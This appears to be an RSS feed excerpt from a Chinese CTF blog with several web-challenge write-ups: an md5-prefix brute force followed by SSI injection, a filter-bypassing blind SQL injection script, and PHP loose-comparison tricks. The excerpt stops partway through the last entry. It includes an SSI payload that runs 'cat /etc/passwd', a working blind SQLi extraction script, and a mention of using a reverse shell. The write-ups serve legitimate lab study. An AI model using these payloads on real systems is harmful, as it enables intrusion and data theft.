&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;header&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;Content-Type: text/html;charset=utf-8&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;***&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]) &lt;span style="color:#66d9ef"&gt;and&lt;/span&gt; $_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $admin &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;6d0bc1&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; ( $admin &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;]),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[+] Welcome to manage system&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_shtml &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;public/&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;get_hash&lt;/span&gt;()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;.shtml&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $shtml &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;fopen&lt;/span&gt;($file_shtml, &lt;span style="color:#e6db74"&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;or&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;Unable to open file!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $text &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; ***
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; ***
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;lt;h1&amp;gt;Hello,&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; ***
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; ***&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;fwrite&lt;/span&gt;($shtml,$text);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;fclose&lt;/span&gt;($shtml);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;***&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;[!] Header error ...&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[!] Failed&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;***&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;***&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;登陆功能又一个验证，需要传入的&lt;code&gt;passwd&lt;/code&gt;参数使用&lt;strong&gt;md5&lt;/strong&gt;加密以后是以&lt;strong&gt;6d0bc1&lt;/strong&gt;开头的。简单写个脚本跑一下就有了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# codeing=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; hashlib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; md&lt;span style="color:#f92672"&gt;=&lt;/span&gt;hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(str(cnt)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode(&lt;span style="color:#e6db74"&gt;&amp;#34;utf8&amp;#34;&lt;/span&gt;))&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; md&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;&amp;#34;6d0bc1&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(cnt)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cnt&lt;span style="color:#f92672"&gt;+=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#2020666&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#2305004&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210417102904.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;看了看文件后缀是一格没有见过的：&lt;code&gt;shtml&lt;/code&gt;，然后学到到了shtml有一种漏洞：&lt;a class="link" href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener"
&gt;SSI注入漏洞&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;简单的命令执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;&amp;#34;--&amp;gt;&amp;#39;--&amp;gt;`--&amp;gt;&amp;lt;&amp;lt;!--#exec cmd=&amp;#34;cat /etc/passwd&amp;#34;--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为&lt;code&gt;flag_990c66bf85a09c664f0b6741840499b2&lt;/code&gt;的文件，获得flag&lt;/p&gt;</description></item><item><title>极客大挑战 2019 FinalSQL</title><link>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</link><pubDate>Sun, 18 Apr 2021 19:11:51 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</guid><description>&lt;p&gt;还是同一场比赛的界面&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416224503.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：&lt;strong&gt;你可别被我逮住了，臭弟弟&lt;/strong&gt;，测试上面的序号，注意此时的url中有&lt;code&gt;?id=&lt;/code&gt;猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个&lt;strong&gt;数字型&lt;/strong&gt;注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。&lt;/p&gt;
&lt;p&gt;发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。&lt;/p&gt;
&lt;p&gt;贴出来自己的脚本：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# codeing=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;result&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; x &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;100&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;127&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low &lt;span style="color:#f92672"&gt;+&lt;/span&gt; high) &lt;span style="color:#f92672"&gt;//&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; high&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;low:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# sql=&amp;#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&amp;#34;%(i,c)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# sql = &amp;#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;F1naI1y&amp;#39;)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;)&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; (x, mid)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sleep(&lt;span style="color:#ae81ff"&gt;0.1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; reponse&lt;span style="color:#f92672"&gt;=&lt;/span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(url&lt;span style="color:#f92672"&gt;+&lt;/span&gt;sql)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Click&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; reponse&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mid&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; mid
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low&lt;span style="color:#f92672"&gt;+&lt;/span&gt;high)&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; chr(int(mid))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(result)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我是直接使用了判断字符的返回值1或0作为id的参数，因为使用&lt;strong&gt;group_concat&lt;/strong&gt;拼接时字符串有逗号&lt;code&gt;,&lt;/code&gt;所以字符ascii需要至少从44开始。&lt;/p&gt;
&lt;p&gt;下面是查询到的两个表F1naI1y 、Flaaaaag及结构&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;F1naI1y ====&amp;gt; id,username,password&lt;/p&gt;
&lt;p&gt;Flaaaaag ====&amp;gt; id,fl4gawsl&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag&lt;/p&gt;</description></item><item><title>WUSTCTF2020 朴实无华</title><link>https://www.braindance.top/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</link><pubDate>Fri, 16 Apr 2021 15:33:32 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</guid><description>&lt;p&gt;进入页面直接报错&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416103737.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;User-agent: *
Disallow: /fAke_f1agggg.php&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;访问&lt;code&gt;fAke_f1agggg.php&lt;/code&gt;并且抓包，在响应头里有提示。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416105630.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;访问&lt;code&gt;fl4g.php&lt;/code&gt;才正式开始，源码如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;img&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/img.jpg&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;header&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Content-type:text/html;charset=utf-8&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__file__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//level 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;num&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $num &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;num&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;intval&lt;/span&gt;($num) &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2020&lt;/span&gt; &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;intval&lt;/span&gt;($num &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2021&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;金钱解决不了穷人的本质问题&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;去非洲吧&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//level 2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $md5&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; ($md5&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($md5))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;去非洲吧&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//get flag
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;get_flag&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $get_flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;get_flag&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;strstr&lt;/span&gt;($get_flag,&lt;span style="color:#e6db74"&gt;&amp;#34; &amp;#34;&lt;/span&gt;)){
